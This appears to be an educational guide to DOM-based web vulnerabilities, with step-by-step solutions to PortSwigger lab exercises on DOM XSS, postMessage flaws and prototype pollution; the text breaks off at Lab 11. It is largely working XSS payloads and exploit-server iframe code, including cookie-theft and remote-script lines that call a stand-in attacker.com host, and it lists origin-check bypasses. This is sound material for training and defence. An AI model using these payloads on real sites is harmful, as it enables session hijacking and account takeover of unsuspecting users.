# DOM-Based Vulnerabilities - Complete Guide

## Table of Contents

1. [Introduction to DOM-Based Vulnerabilities](#introduction)
2. [DOM XSS Fundamentals](#dom-xss-fundamentals)
3. [PortSwigger Labs - Complete Solutions](#portswigger-labs)
4. [Web Messages Exploitation](#web-messages-exploitation)
5. [Prototype Pollution Attacks](#prototype-pollution)
6. [DOM Clobbering](#dom-clobbering)
7. [Advanced Exploitation Techniques](#advanced-techniques)
8. [Detection and Prevention](#detection-and-prevention)
9. [Tools and Automation](#tools-and-automation)
10. [Real-World Examples](#real-world-examples)

---

## Introduction to DOM-Based Vulnerabilities {#introduction}

### What Are DOM-Based Vulnerabilities?

DOM-based vulnerabilities arise when a web application contains JavaScript that takes attacker-controllable data from a **source** and passes it to a dangerous **sink** without proper validation or sanitization.

**Key Characteristics:**
- Client-side execution (JavaScript processes the payload)
- May not appear in HTTP responses
- Difficult to detect with traditional scanners
- Can bypass server-side protections

### Sources and Sinks

**Common Sources (where attacker data originates):**
- `location.search` - URL query parameters
- `location.hash` - URL fragment identifier
- `location.href` - Full URL
- `document.referrer` - Referrer header
- `document.cookie` - Cookie values
- `postMessage` - Web messages
- `window.name` - Window name property
- Web Storage (localStorage, sessionStorage)

**Common Sinks (dangerous functions):**
- `document.write()` - Writes HTML to page
- `innerHTML` - Sets HTML content
- `outerHTML` - Replaces element with HTML
- `eval()` - Executes JavaScript code
- `setTimeout()` / `setInterval()` - Execute code strings
- `Function()` - Creates functions from strings
- `location` - Navigates to URLs
- `element.src` - Sets source URLs
- `element.href` - Sets link targets
- jQuery methods: `$()`, `.html()`, `.attr()`

### DOM-Based Vulnerability Types

1. **DOM XSS** - Cross-site scripting via DOM manipulation
2. **DOM-based Open Redirect** - Redirect to attacker-controlled URLs
3. **DOM-based Cookie Manipulation** - Inject malicious cookie values
4. **Web Message Vulnerabilities** - Exploit postMessage handlers
5. **Prototype Pollution** - Pollute Object.prototype
6. **DOM Clobbering** - Override DOM properties with HTML

---

## DOM XSS Fundamentals {#dom-xss-fundamentals}

### Classic DOM XSS Pattern

```javascript
// Vulnerable code
var search = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML = search;

// Attack URL
/?q=<img src=x onerror=alert(1)>
```

### Context-Based Exploitation

#### 1. HTML Context
When your input is reflected in HTML:

```html
<div id="output">USER_INPUT</div>
```

**Payloads:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<input onfocus=alert(1) autofocus>
```

#### 2. Attribute Context
When your input is inside an HTML attribute:

```html
<input value="USER_INPUT">
```

**Payloads:**
```html
" onclick="alert(1)
" onfocus="alert(1)" autofocus="
' onmouseover='alert(1)
```

#### 3. JavaScript String Context
When your input is inside a JavaScript string:

```javascript
var name = "USER_INPUT";
```

**Payloads:**
```javascript
"; alert(1); //
'-alert(1)-'
\"; alert(1); //
```

#### 4. URL/href Context
When your input sets a URL:

```html
<a href="USER_INPUT">Click</a>
```

**Payloads:**
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Sink-Specific Exploitation

#### document.write()

**Vulnerability:**
```javascript
document.write('<img src="/tracker.gif?q=' + userInput + '">');
```

**Exploitation:**
- Can inject full HTML/script tags
- Executes immediately during page parsing
- Most permissive sink

**Payload:**
```html
"><script>alert(1)</script>
"><svg onload=alert(1)>
```

#### innerHTML

**Vulnerability:**
```javascript
element.innerHTML = userInput;
```

**Limitations:**
- `<script>` tags won't execute
- Must use event handlers

**Payloads:**
```html
<img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<iframe src=x onerror=alert(1)>
```

#### jQuery Sinks

**Vulnerable patterns:**
```javascript
$(userInput)                    // Selector sink
$element.html(userInput)        // HTML sink
$element.attr('href', userInput) // Attribute sink
```

**Exploitation:**
```javascript
// For $(userInput)
<img src=x onerror=alert(1)>

// For .attr('href', ...)
javascript:alert(1)

// For .html()
<img src=x onerror=alert(1)>
```

#### eval() and Function()

**Vulnerability:**
```javascript
eval(userInput);
new Function(userInput)();
```

**Exploitation:**
- Direct JavaScript execution
- Most dangerous sink

**Payloads:**
```javascript
alert(1)
alert(document.domain)
fetch('https://attacker.com?c='+document.cookie)
```

---

## PortSwigger Labs - Complete Solutions {#portswigger-labs}

### Lab 1: DOM XSS in document.write sink using source location.search

**Difficulty:** Apprentice

**Lab URL Pattern:** `https://LAB-ID.web-security-academy.net`

#### Vulnerable Code
```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```

#### Vulnerability Analysis
- **Source:** `location.search` (search parameter)
- **Sink:** `document.write()`
- **Context:** Inside img src attribute
- **No sanitization:** Direct concatenation

#### Step-by-Step Solution

1. Navigate to the lab homepage
2. Use the search box to submit a test query
3. Observe the URL: `/?search=test`
4. Inject the payload: `/?search="><svg onload=alert(1)>`
5. The alert fires, solving the lab

#### Working Payloads

```html
"><svg onload=alert(1)>
"><script>alert(document.domain)</script>
"><img src=x onerror=alert(1)>
```

#### Complete Exploitation URL
```
https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%20onload%3Dalert(1)%3E
```

#### Burp Suite Workflow

**Using DOM Invader:**
1. Open Burp's built-in browser
2. Enable DOM Invader (F12 > DOM Invader tab)
3. Navigate to the lab
4. DOM Invader auto-injects canary into search parameter
5. Check "Sinks" panel - shows `document.write` sink
6. Click the sink to see context and stack trace
7. Craft payload based on context: `"><svg onload=alert(1)>`

**Using Proxy:**
1. Intercept search request
2. Modify search parameter to include payload
3. Forward request
4. Observe XSS execution

**Using Repeater:**
1. Send GET request to Repeater
2. Modify: `GET /?search="><svg onload=alert(1)> HTTP/1.1`
3. Send and view response HTML

#### Common Mistakes
- Forgetting to close the attribute with `"`
- Not closing the img tag with `>`
- Using only `<script>alert(1)</script>` without breaking out
- Not URL-encoding when testing via browser

---

### Lab 2: DOM XSS in innerHTML sink using source location.search

**Difficulty:** Apprentice

#### Vulnerable Code
```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

#### Vulnerability Analysis
- **Source:** `location.search`
- **Sink:** `innerHTML`
- **Critical limitation:** `<script>` tags won't execute
- **Must use:** Event handlers

#### Step-by-Step Solution

1. Navigate to lab and search for "test"
2. Observe URL: `/?search=test`
3. View page source: `<div id="searchMessage">test</div>`
4. Try `<script>alert(1)</script>` - this FAILS
5. Use event handler: `/?search=<img src=x onerror=alert(1)>`
6. Alert fires, lab solved

#### Working Payloads

```html
<img src=1 onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<iframe src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

#### Why innerHTML is Different

**Script tags don't work:**
```html
<script>alert(1)</script> ❌ Won't execute
```

**SVG onload doesn't work:**
```html
<svg onload=alert(1)> ❌ Won't execute
```

**Event handlers DO work:**
```html
<img src=x onerror=alert(1)> ✅ Executes
```

#### Burp Suite Workflow

**DOM Invader Detection:**
1. DOM Invader shows `innerHTML` in sinks panel
2. Confirms no encoding/sanitization
3. Context shows it's direct innerHTML assignment
4. Craft img onerror payload

**Testing with Intruder:**
1. Send request to Intruder
2. Mark search parameter as payload position
3. Load XSS payload list (filter out script tags)
4. Start attack
5. Look for 200 responses with successful execution

---

### Lab 3: DOM XSS in jQuery anchor href attribute sink using location.search source

**Difficulty:** Apprentice

#### Vulnerable Code
```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

#### Vulnerability Analysis
- **Source:** `location.search` (returnPath parameter)
- **Sink:** jQuery `.attr()` setting href
- **Attack vector:** javascript: protocol
- **Requires:** User interaction (clicking the link)

#### Step-by-Step Solution

1. Navigate to `/feedback` page
2. Observe "Back" link with id="backLink"
3. Test: `/feedback?returnPath=/test`
4. Inspect link: `<a href="/test">Back</a>`
5. Inject: `/feedback?returnPath=javascript:alert(document.cookie)`
6. Click "Back" link
7. Alert fires, lab solved

#### Working Payloads

```
javascript:alert(document.cookie)
javascript:alert(document.domain)
javascript:alert(1)
javascript:eval(atob('YWxlcnQoMSk='))
javascript:fetch('https://attacker.com?c='+document.cookie)
```

#### Complete URL
```
https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

#### How It Works

1. jQuery extracts `returnPath` from URL
2. Sets `href` attribute: `<a href="javascript:alert(document.cookie)">Back</a>`
3. When user clicks, browser executes the JavaScript
4. `javascript:` protocol tells browser to run code instead of navigate

#### Alternative Protocols

**Data URI:**
```
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

**VBScript (IE only):**
```
vbscript:msgbox(1)
```

#### Burp Suite Workflow

**DOM Invader:**
1. Navigate to /feedback
2. DOM Invader shows attr sink
3. Click sink to see: `$('#backLink').attr("href", ...)`
4. Verify href contains canary
5. Replace with javascript:alert(document.cookie)

**Manual Testing:**
1. Intercept feedback page request
2. Add: `?returnPath=javascript:alert(document.cookie)`
3. Forward request
4. Click "Back" link on rendered page

---

### Lab 4: DOM XSS in jQuery selector sink using a hashchange event

**Difficulty:** Apprentice

#### Vulnerable Code
```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

#### Vulnerability Analysis
- **Source:** `location.hash` (URL fragment)
- **Sink:** jQuery `$()` selector
- **Trigger:** `hashchange` event
- **Challenge:** Need to change the hash dynamically

#### Why Direct Navigation Fails

```
/#<img src=x onerror=alert(1)> ❌ No hash CHANGE occurs
```

The vulnerability only triggers when the hash **changes**, not on initial load.

#### Step-by-Step Solution

1. Understand that hashchange event needs a hash change
2. Create iframe that loads page, then modifies hash
3. Deploy via exploit server
4. When loaded, hash changes and XSS fires

#### Working Exploit

**Exploit Server Body:**
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#"
        onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

#### How It Works

1. **iframe loads:** `src="https://LAB-ID/#"`
   - Page loads with empty hash
   - No hashchange event yet

2. **onload fires:** `this.src+='<img src=x onerror=print()>'`
   - Appends to iframe src
   - New src: `https://LAB-ID/#<img src=x onerror=print()>`

3. **Hash changes:** From `#` to `#<img src=x onerror=print()>`
   - Triggers hashchange event

4. **Vulnerable code executes:**
   ```javascript
   $('section.blog-list h2:contains(<img src=x onerror=print()>)')
   ```

5. **jQuery parses HTML:** Creates img element, onerror fires

#### Alternative Payloads

```html
<iframe src="https://LAB-ID/#" onload="this.src+='<svg onload=alert(1)>'"></iframe>
<iframe src="https://LAB-ID/#" onload="this.src+='<input onfocus=alert(1) autofocus>'"></iframe>
<iframe src="https://LAB-ID/#" onload="this.src+='<iframe src=javascript:alert(1)>'"></iframe>
```

#### Burp Suite Workflow

1. Open exploit server
2. Paste iframe payload in Body
3. Click "Store"
4. Click "View exploit" - print dialog should appear
5. Click "Deliver to victim" to solve lab

**Testing Manually:**
```javascript
// In browser console on lab page
window.location.hash = '<img src=x onerror=alert(1)>';
```

---

### Lab 5: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**Difficulty:** Practitioner

#### Vulnerable Code
```html
<body ng-app>
    <div>You searched for: {{searchTerm}}</div>
</body>

<script>
var search = (new URLSearchParams(window.location.search)).get('search');
</script>
```

#### Vulnerability Analysis
- **Framework:** AngularJS (version 1.x)
- **Protection:** Angle brackets and quotes are HTML-encoded
- **Bypass:** AngularJS evaluates `{{}}` expressions before encoding
- **Attack vector:** AngularJS expression injection

#### Why Traditional Payloads Fail

```html
<script>alert(1)</script> ❌ HTML-encoded
<img src=x onerror=alert(1)> ❌ HTML-encoded
```

AngularJS processes expressions **before** HTML rendering.

#### Step-by-Step Solution

1. Navigate to lab and search for "test"
2. Observe `ng-app` directive in page source
3. Try HTML payload - gets encoded
4. Recognize AngularJS context
5. Use AngularJS expression: `/?search={{$on.constructor('alert(1)')()}}`
6. Alert fires, lab solved

#### Working Payloads

```javascript
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
{{toString.constructor.prototype.toString.constructor('alert(1)')()}}
```

#### Payload Breakdown: `{{$on.constructor('alert(1)')()}}`

1. **`{{  }}`** - AngularJS expression delimiters
2. **`$on`** - Built-in AngularJS scope method (a function)
3. **`.constructor`** - Every function's constructor property → `Function`
4. **`('alert(1)')`** - Call Function constructor with code string
5. **`()`** - Immediately execute the created function

#### Understanding the Bypass

```javascript
// Step by step
$on                           // Function object
$on.constructor               // Function (the constructor)
$on.constructor('alert(1)')   // Creates: function anonymous() { alert(1) }
$on.constructor('alert(1)')() // Executes the function
```

#### AngularJS Version-Specific Payloads

**AngularJS 1.0.x - 1.1.x:**
```javascript
{{constructor.constructor('alert(1)')()}}
```

**AngularJS 1.2.x - 1.5.x (with sandbox):**
```javascript
{{toString.constructor.prototype.toString.constructor('alert(1)')()}}
```

**AngularJS 1.6+ (sandbox removed):**
```javascript
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

#### Advanced Exploitation

**Multiple statements:**
```javascript
{{$on.constructor('alert(1);alert(2);alert(3)')()}}
```

**Cookie theft:**
```javascript
{{$on.constructor('document.location="https://attacker.com?c="+document.cookie')()}}
```

**Loading external script:**
```javascript
{{$on.constructor('var s=document.createElement("script");s.src="https://attacker.com/evil.js";document.body.appendChild(s)')()}}
```

#### Burp Suite Workflow

**Identifying AngularJS:**
- Look for `ng-app` directive in HTML
- Check for `/angular.js` in script sources
- Browser console: `typeof angular !== 'undefined'`
- Check `angular.version`

**Testing:**
1. Use Repeater to test expression payloads
2. Try different AngularJS bypass techniques
3. Verify expression evaluation in response

---

### Lab 6: DOM XSS in document.write sink using source location.search inside a select element

**Difficulty:** Practitioner

#### Vulnerable Code
```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) continue;
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

#### Vulnerability Analysis
- **Source:** `location.search` (storeId parameter)
- **Sink:** `document.write()`
- **Context:** Inside `<select>` element, within `<option>` tag
- **Challenge:** Must break out of select context

#### Step-by-Step Solution

1. Navigate to any product page: `/product?productId=1`
2. Observe stock checker with store dropdown
3. Test: `/product?productId=1&storeId=TEST`
4. Inspect HTML: `<option selected>TEST</option>`
5. Inject: `/product?productId=1&storeId="></select><img src=1 onerror=alert(1)>`
6. Alert fires, lab solved

#### Working Payloads

```html
"></select><img src=1 onerror=alert(1)>
"></select><script>alert(1)</script>
"></select><svg onload=alert(1)>
"></select><iframe src="javascript:alert(1)">
```

#### Payload Breakdown: `"></select><img src=1 onerror=alert(1)>`

1. **`">`** - Closes the option tag
2. **`</select>`** - Closes the select element (escapes restrictive context)
3. **`<img src=1 onerror=alert(1)>`** - Injects executable code

#### Before and After

**Before injection:**
```html
<select name="storeId">
    <option selected>USER_INPUT</option>
    <option>London</option>
</select>
```

**After injection:**
```html
<select name="storeId">
    <option selected>"></select><img src=1 onerror=alert(1)></option>
</select>
```

**What browser sees:**
```html
<select name="storeId">
    <option selected>">
</select>
<img src=1 onerror=alert(1)>
<!-- Rest is parsed differently -->
```

#### Why Breaking Out is Necessary

**Select element restrictions:**
- Only `<option>` and `<optgroup>` are valid children
- Event handlers on options are unreliable
- Can't inject scripts without escaping

**Must close </select> to:**
- Exit restrictive context
- Return to normal HTML parsing
- Allow arbitrary HTML injection

#### Complete URL
```
https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E
```

#### Common Mistakes
- Forgetting to close select: `"><img src=x onerror=alert(1)>` ❌
- Not closing the attribute: `</select><img src=x onerror=alert(1)>` ❌
- Wrong parameter name: Using `store` instead of `storeId` ❌
- Testing on wrong page: Must be on product page ❌

#### Burp Suite Workflow

**Using DOM Invader:**
1. Navigate to product page
2. DOM Invader may auto-inject into storeId
3. Check sinks panel for document.write
4. Verify context shows select/option structure
5. Craft breakout payload

**Using Repeater:**
1. Send product page request to Repeater
2. Add storeId parameter with payload
3. Send and analyze response HTML
4. Verify injection point and context

---

## Web Messages Exploitation {#web-messages-exploitation}

### Introduction to postMessage API

The `postMessage` API allows cross-origin communication between windows:

```javascript
// Sending a message
targetWindow.postMessage(message, targetOrigin);

// Receiving a message
window.addEventListener('message', function(event) {
    // event.data - The message
    // event.origin - Sender's origin
    // event.source - Reference to sender window
});
```

### Lab 7: DOM XSS using web messages

**Difficulty:** Practitioner

#### Vulnerable Code
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
}, false);
```

#### Vulnerability Analysis
- **No origin validation** - Accepts messages from any origin
- **Dangerous sink** - Direct innerHTML assignment
- **Attack vector** - Attacker-controlled iframe sends malicious message

#### Step-by-Step Solution

1. Identify the web message listener in page source
2. Notice no origin validation
3. Create exploit that sends malicious message
4. Deploy via exploit server

#### Working Exploit

**Exploit Server Body:**
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
        onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

#### How It Works

1. **iframe loads target page** containing the vulnerable listener
2. **onload event fires** when iframe finishes loading
3. **postMessage sends payload** to the iframe's window
4. **Target receives message** via event listener
5. **innerHTML sink executes** the img onerror payload

#### Payload Variations

```html
<!-- Basic alert -->
<iframe src="https://LAB-ID/"
        onload="this.contentWindow.postMessage('<img src=1 onerror=alert(1)>','*')">
</iframe>

<!-- Print function -->
<iframe src="https://LAB-ID/"
        onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
</iframe>

<!-- SVG vector -->
<iframe src="https://LAB-ID/"
        onload="this.contentWindow.postMessage('<svg onload=alert(1)>','*')">
</iframe>

<!-- Multiple statements -->
<iframe src="https://LAB-ID/"
        onload="this.contentWindow.postMessage('<img src=1 onerror=\"alert(1);alert(2)\">','*')">
</iframe>
```

#### Understanding the postMessage Call

```javascript
this.contentWindow.postMessage(message, targetOrigin)
```

- **`this`** - The iframe element
- **`contentWindow`** - The window object inside the iframe
- **`postMessage()`** - Sends message to that window
- **`'*'`** - Target origin (wildcard = any origin)

#### Why Origin Validation Matters

**Vulnerable (no validation):**
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
});
```

**Secure (with validation):**
```javascript
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted.com') return;
    document.getElementById('ads').innerHTML = DOMPurify.sanitize(e.data);
});
```

---

### Lab 8: DOM XSS using web messages and a JavaScript URL

**Difficulty:** Practitioner

#### Vulnerable Code
```javascript
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

#### Vulnerability Analysis
- **Flawed validation** - Uses `indexOf()` which checks for substring anywhere
- **Sink:** `location.href` - Can execute javascript: protocol
- **Bypass:** Append 'https:' after javascript: protocol in comment

#### Step-by-Step Solution

1. Analyze the validation logic
2. Recognize `indexOf()` checks for substring anywhere in string
3. Craft payload: `javascript:print()//https:`
4. The `//` comments out everything after, including 'https:'
5. Browser sees `javascript:print()` and executes it

#### Working Exploit

**Exploit Server Body:**
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
        onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
</iframe>
```

#### Payload Breakdown: `javascript:print()//https:`

1. **`javascript:print()`** - JavaScript protocol with function call
2. **`//`** - JavaScript single-line comment
3. **`https:`** - Required substring for validation (commented out)

#### How the Bypass Works

**Validation check:**
```javascript
url.indexOf('https:') > -1  // Returns position of 'https:' in string
// 'javascript:print()//https:'.indexOf('https:') → 22 (found!)
// Check passes ✓
```

**Browser execution:**
```javascript
location.href = 'javascript:print()//https:'
// Browser interprets: javascript:print()
// Everything after // is a comment
```

#### Alternative Bypasses

```javascript
// Using comment
javascript:alert(1)//https:
javascript:alert(1)//http:

// Using both protocols
javascript:alert(1)/*https://example.com*/

// Multi-line comment
javascript:alert(1)/*
https:
*/
```

#### Why indexOf() is Dangerous

**Vulnerable patterns:**
```javascript
// Checks if substring exists ANYWHERE
if (url.indexOf('https:') > -1)      // ❌ Bypassable
if (url.indexOf('trusted.com') > -1) // ❌ Bypassable: evil.trusted.com.attacker.com

// Secure alternatives
if (url.startsWith('https://trusted.com')) // ✓ Better
if (url.match(/^https:\/\/trusted\.com/))   // ✓ Even better
```

#### Complete Exploit with Variations

```html
<!-- Basic alert -->
<iframe src="https://LAB-ID/"
        onload="this.contentWindow.postMessage('javascript:alert(1)//https:','*')">
</iframe>

<!-- Cookie theft -->
<iframe src="https://LAB-ID/"
        onload="this.contentWindow.postMessage('javascript:fetch(\"https://attacker.com?c=\"+document.cookie)//https:','*')">
</iframe>

<!-- Load external script -->
<iframe src="https://LAB-ID/"
        onload="this.contentWindow.postMessage('javascript:var s=document.createElement(\"script\");s.src=\"https://attacker.com/xss.js\";document.body.appendChild(s);//https:','*')">
</iframe>
```

---

### Lab 9: DOM XSS using web messages and JSON.parse

**Difficulty:** Practitioner

#### Vulnerable Code
```javascript
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe');
    var d = JSON.parse(e.data);
    switch(d.type) {
        case "load-channel":
            iframe.src = d.url;
            document.body.appendChild(iframe);
            break;
    }
}, false);
```

#### Vulnerability Analysis
- **JSON.parse()** - Safely parses JSON (not the vulnerability)
- **Dangerous sink** - `iframe.src` set to user-controlled value
- **Attack vector** - javascript: protocol in iframe src
- **No validation** - url property used directly

#### Step-by-Step Solution

1. Analyze code: JSON with `type` and `url` properties
2. Notice `iframe.src = d.url` without validation
3. Craft JSON with javascript: protocol
4. Send via postMessage from exploit server

#### Working Exploit

**Exploit Server Body:**
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

#### JSON Payload Structure

```json
{
    "type": "load-channel",
    "url": "javascript:print()"
}
```

**As string for postMessage:**
```javascript
'{"type":"load-channel","url":"javascript:print()"}'
```

#### How It Works

1. **postMessage sends JSON string** to target window
2. **Target receives and parses:** `var d = JSON.parse(e.data)`
3. **Switch statement matches:** `case "load-channel"`
4. **iframe created and src set:** `iframe.src = d.url` → `iframe.src = "javascript:print()"`
5. **iframe added to page:** Browser executes JavaScript

#### Payload Variations

```html
<!-- Alert -->
<iframe src="https://LAB-ID/"
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}","*")'>
</iframe>

<!-- Alert document.domain -->
<iframe src="https://LAB-ID/"
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.domain)\"}","*")'>
</iframe>

<!-- Cookie theft -->
<iframe src="https://LAB-ID/"
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:fetch(\\\"https://attacker.com?c=\\\"+document.cookie)\"}","*")'>
</iframe>

<!-- Data URI -->
<iframe src="https://LAB-ID/"
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"data:text/html,<script>alert(1)</script>\"}","*")'>
</iframe>
```

#### Quote Escaping in JSON

**In HTML attribute (single quotes for attribute, double for JSON):**
```html
onload='...postMessage("{\"type\":\"load-channel\"}", "*")'
```

**In JavaScript string (must escape both):**
```javascript
var msg = "{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}";
```

#### Why JSON.parse Isn't the Issue

```javascript
// JSON.parse is safe - it only parses JSON
var d = JSON.parse('{"type":"load-channel","url":"javascript:print()"}');
// Result: {type: "load-channel", url: "javascript:print()"}

// The vulnerability is using the parsed data unsafely
iframe.src = d.url; // ❌ No validation before using
```

#### Secure Implementation

```javascript
window.addEventListener('message', function(e) {
    // Validate origin
    if (e.origin !== 'https://trusted.com') return;

    var iframe = document.createElement('iframe');
    var d = JSON.parse(e.data);

    switch(d.type) {
        case "load-channel":
            // Validate URL
            if (!d.url.startsWith('https://')) return;
            if (!d.url.includes('trusted.com')) return;

            iframe.src = d.url;
            document.body.appendChild(iframe);
            break;
    }
});
```

---

### Advanced Web Message Exploitation Techniques

#### Origin Validation Bypasses

**1. indexOf() bypass:**
```javascript
// Vulnerable
if (e.origin.indexOf('trusted.com') > -1)
// Bypass: https://trusted.com.attacker.com
```

**2. startsWith() bypass:**
```javascript
// Vulnerable
if (e.origin.startsWith('https://trusted'))
// Bypass: https://trusted.attacker.com
```

**3. endsWith() bypass:**
```javascript
// Vulnerable
if (e.origin.endsWith('trusted.com'))
// Bypass: https://evilsite.trusted.com
```

**4. Regex bypass (unescaped dot):**
```javascript
// Vulnerable
if (e.origin.match(/https:\/\/trusted.com/))
// Bypass: https://trustedXcom (dot matches any character)
```

**5. Null origin:**
```javascript
// Some implementations check for null
if (e.origin === 'null') {
    // Sandboxed iframe has null origin
}
```

**Exploit for null origin:**
```html
<iframe sandbox="allow-scripts allow-forms"
        src="data:text/html,<script>
            parent.postMessage('payload', '*');
        </script>">
</iframe>
```

#### Nested iframe Hijacking

```html
<iframe src="https://target.com/page" name="victim"></iframe>
<iframe src="https://target.com/page" onload="
    this.contentWindow.postMessage('malicious', '*');
"></iframe>
```

#### Window.name Hijacking Combined with postMessage

```html
<script>
window.name = 'malicious_data';
window.location = 'https://target.com/vulnerable';
</script>
```

---

## Prototype Pollution Attacks {#prototype-pollution}

### Introduction to Prototype Pollution

Prototype pollution allows attackers to inject properties into `Object.prototype`, affecting all JavaScript objects.

**Concept:**
```javascript
// Normal object
let obj = {};
obj.admin; // undefined

// After pollution
Object.prototype.admin = true;
obj.admin; // true (inherited from prototype)
```

### How Prototype Pollution Works

**Pollution sources:**
```javascript
// URL parameter
/?__proto__[admin]=true

// JSON parsing (unsafe merge)
Object.assign({}, JSON.parse(userInput))

// Recursive merge
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key]; // Can pollute via __proto__
    }
}
```

### Lab 10: DOM XSS via Client-Side Prototype Pollution

**Difficulty:** Practitioner

#### Vulnerable Code

**deparam.js (pollution source):**
```javascript
function deparam(params) {
    let obj = {};
    params.replace(/([^=&]+)=([^&]*)/g, function(m, key, value) {
        obj[decodeURIComponent(key)] = decodeURIComponent(value);
    });
    return obj;
}
// Usage: deparam(location.search.substring(1))
// Allows: ?__proto__[property]=value
```

**searchLogger.js (gadget):**
```javascript
let config = {};
if (config.transport_url) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.body.appendChild(script);
}
```

#### Vulnerability Analysis
- **Pollution source:** URL parameters via `deparam.js`
- **Pollution vector:** `__proto__[property]`
- **Gadget:** `config.transport_url` check
- **Sink:** `script.src` assignment

#### Step-by-Step Solution

1. Identify prototype pollution source (deparam.js)
2. Find the gadget (transport_url in searchLogger.js)
3. Craft pollution URL: `/?__proto__[transport_url]=data:,alert(1);//`
4. Navigate to the URL
5. Script loads and executes

#### Working Payload

```
/?__proto__[transport_url]=data:,alert(1);//
```

#### Payload Breakdown

1. **`__proto__`** - Special property that references Object.prototype
2. **`[transport_url]`** - Property name to pollute
3. **`data:,alert(1);`** - Data URI with JavaScript
4. **`//`** - Comments out any hardcoded suffix

#### How the Exploit Works

**Step 1 - Pollution:**
```javascript
// URL: /?__proto__[transport_url]=data:,alert(1);//
// deparam.js processes this and creates:
Object.prototype.transport_url = 'data:,alert(1);//'
```

**Step 2 - Gadget triggers:**
```javascript
let config = {}; // Empty object
if (config.transport_url) { // undefined in config, checks prototype
    // Object.prototype.transport_url exists!
    let script = document.createElement('script');
    script.src = config.transport_url; // 'data:,alert(1);//'
    document.body.appendChild(script); // XSS!
}
```

**Step 3 - Execution:**
```html
<script src="data:,alert(1);//"></script>
```

#### Alternative Payloads

```
/?__proto__[transport_url]=data:,alert(document.domain);//
/?__proto__[transport_url]=https://attacker.com/xss.js
/?__proto__[transport_url]=data:text/html,<script>alert(1)</script>
```

#### Using Burp Suite DOM Invader

**Automatic Detection:**
1. Open lab in Burp's browser with DOM Invader enabled
2. Open Developer Tools → DOM Invader tab
3. Click "Scan for prototype pollution sources"
4. DOM Invader identifies `__proto__` in URL parameters
5. Click "Scan for gadgets"
6. DOM Invader finds `transport_url` gadget in script.src
7. Click "Exploit" → Generates working payload
8. Verify XSS executes

**Manual Testing:**
```javascript
// In browser console
Object.prototype.test = 'polluted';
let obj = {};
console.log(obj.test); // 'polluted' - pollution confirmed
```

#### Common Gadgets

**Script source:**
```javascript
if (config.scriptSrc) {
    let script = document.createElement('script');
    script.src = config.scriptSrc;
}
```

**eval() with options:**
```javascript
if (options.onload) {
    eval(options.onload);
}
```

**innerHTML with template:**
```javascript
if (settings.template) {
    element.innerHTML = settings.template;
}
```

**location redirect:**
```javascript
if (redirect.url) {
    location.href = redirect.url;
}
```

---

### Lab 11: DOM XSS via Alternative Prototype Pollution Vector

**Difficulty:** Practitioner

#### Vulnerable Code

**searchLoggerAlternative.js:**
```javascript
let manager = {};
if (manager && manager.sequence) {
    eval('manager.macro(' + manager.sequence + ')');
}
```

